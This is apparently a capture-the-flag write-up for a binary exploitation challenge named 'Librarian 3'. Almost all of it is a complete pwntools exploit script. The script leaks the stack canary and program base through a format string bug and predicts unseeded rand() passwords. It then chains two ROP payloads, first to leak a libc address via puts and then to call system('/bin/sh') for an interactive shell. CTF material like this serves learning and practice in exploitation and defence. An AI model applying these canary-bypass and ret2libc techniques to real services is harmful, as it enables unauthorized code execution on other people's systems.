# Librarian 3 (142 pts) - Pwn

Same as librarian 1, but PIE and canary are enabled. Use a format string to leak both:

```python3
#!/usr/bin/env python3

from pwn import *
import binascii

# we are given the binary
elf = ELF("./librarian3")
context.arch = 'amd64'

# we leak libc with the below steps multiple times with different functions
# and then download it from https://libc.rip
libc = ELF('./libc.so.6')

conn = elf.process()
# connect to the server
#conn = remote("oreos.imaginary.ml", 7333)

# get the canary and an address from the binary through a format string vulnerability
conn.sendline("%17$p%15$p")
# rand() is called without srand(), so our seed is 0.
# The password will always be the same
conn.sendline("1804289383")

conn.recvuntil('0x')
leak = conn.recvline().decode().split('0x')
print(leak)
canary = int(leak[0], 16)
base = int(leak[1], 16)-0x1120
log.info("Canary: " + hex(canary))
log.info("Program base: " + hex(base))

elf.address = base
rop = ROP(elf)

conn.sendline("42") #some number that isn't 1-5 will trigger the error prompt

conn.recvuntil("to our library.")

# Time to leak a libc address!
payload = b'A'*40 # offset to the canary
payload += p64(canary) # put in the canary
payload += p64(base) # rbp
payload += p64(rop.find_gadget(['ret'])[0]) # stack alignment
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) # rdi is for the first arg
payload += p64(elf.got['puts']) # first arg is the GOT entry of puts, points to puts in libc
payload += p64(elf.plt['puts']) # calls puts()
payload += p64(rop.find_gadget(['ret'])[0]) # stack alignment
payload += p64(elf.symbols['main']) # calls main() after puts is run
conn.sendline(payload) # send this payload

# extra lines
conn.recvline()
conn.recvline()

# recieve our leak, accounting for endianness
puts_libc = int(binascii.hexlify(conn.recvline()[::-1]).replace(b'0a', b'').decode(), 16)

log.info("puts() libc: " + hex(puts_libc))

libc.address = puts_libc - libc.symbols['puts'] # find the libc base
bin_sh = next(libc.search(b"/bin/sh")) # find the address of /bin/sh in libc
system_libc = libc.symbols['system'] # find the address of system() in libc

log.info("libc base: " + hex(libc.address))
log.info("system(): " + hex(system_libc))
log.info("/bin/sh: " + hex(bin_sh))

conn.sendline("aaa")
conn.sendline("846930886") # second random number with seed 0
conn.sendline("42") # bring up the error / asking for feedback
conn.recvuntil("to our library.")

payload = b'A'*40
payload += p64(canary)
payload += p64(0) # rbp
payload += p64(rop.find_gadget(['ret'])[0]) # stack alignment :(
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) # load first arg
payload += p64(bin_sh) # address of /bin/sh in libc
payload += p64(system_libc) # address of system() in libc
conn.sendline(payload)

conn.recvuntil("!")
conn.recvline()

log.info("You should have a shell now... ")
conn.interactive() # WE GET A SHELL!!!!!

```

